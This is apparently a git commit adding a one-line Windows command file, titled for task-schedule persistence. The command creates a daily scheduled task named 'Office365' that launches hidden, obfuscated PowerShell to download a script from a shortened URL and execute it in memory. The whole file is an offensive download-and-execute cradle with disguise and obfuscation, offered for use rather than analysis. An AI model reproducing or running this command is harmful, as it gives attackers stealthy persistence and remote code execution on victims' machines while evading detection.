423451c0e3aef371f56e3dc7f191a6bec206b365
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-25 14:50:32 +0100

    Create Taskschedule_Persistence.cmd

---
+++ Taskschedule_Persistence.cmd
@@ -0,0 +1,2 @@
+# Obfuscated Windows Command Shell Cradles which can be used in a cmd.exe to create a taskschedule persistence 
+cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"https://cutt.ly/WS8Vek5\\\"))""
